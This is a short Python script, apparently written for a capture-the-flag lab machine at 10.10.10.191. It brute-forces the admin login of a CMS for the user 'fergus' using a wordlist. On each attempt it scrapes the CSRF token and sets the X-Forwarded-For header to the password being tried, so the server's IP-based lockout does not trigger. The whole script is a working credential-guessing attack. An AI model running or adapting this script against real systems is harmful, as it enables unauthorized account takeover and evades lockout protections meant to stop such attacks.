#!/usr/bin/env python3
import re  # работа с регулярными выражениями (последовательность символов, используемых для поиска и замены текста в строке или файле)
import requests
#from future import print_function

def open_resources(file_path):
    return [item.replace("\n", "") for item in open(file_path).readlines()]

host = 'http://10.10.10.191'
login_url = host + '/admin/login/'
username = 'fergus'
wordlist = open_resources('/home/ama/wordlist.txt')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)  # script pull csrf token

    print('[*] Trying: {p}'. format(p=password))

    headers = {
            'X-Forwarded-For': password,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
            'Referer': login_url
    }
    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }
    login_result = session.post(login_url, headers=headers, data=data, allow_redirects=False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('Success: Password found!')
            print('Use {u}:{p} to login.'.format(u=username, p=password))
            print()
            break
else:
    print('Password not found in Wordlist')